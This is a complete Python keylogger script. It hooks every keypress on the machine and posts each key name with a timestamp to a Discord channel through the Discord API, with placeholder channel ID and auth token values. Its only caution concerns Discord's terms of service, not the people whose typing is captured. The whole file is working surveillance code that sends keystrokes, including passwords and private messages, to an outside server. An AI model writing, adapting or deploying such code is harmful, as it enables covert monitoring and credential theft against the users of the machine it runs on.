import keyboard
import requests
from datetime import datetime

# Define the Discord webhook URL for your channel
webhook_url = "https://discord.com/api/v9/channels/channel_id_here/messages"

# Warning!! I do believe using your discord auth token violates their TOS, use at your own risk.

def send_to_discord(message):
    payload = {'content': message}
    header = {
        'authorization': 'auth_token_here'
    }

    r = requests.post(webhook_url, data=payload, headers=header)

def on_key_event(e):
    try:
        if e.event_type == keyboard.KEY_DOWN:
            # Get the current time
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Send the key event with the current time to Discord
            send_to_discord(f"Key pressed at {current_time}: {e.name}")
    except Exception as ex:
        print(f"Error: {ex}")

# Register the key event handler
keyboard.hook(on_key_event)

# Run the script indefinitely
try:
    keyboard.wait("esc")  # Wait for the 'Esc' key to exit the script
except KeyboardInterrupt:
    pass
finally:
    # Unhook the key event handler
    keyboard.unhook_all()
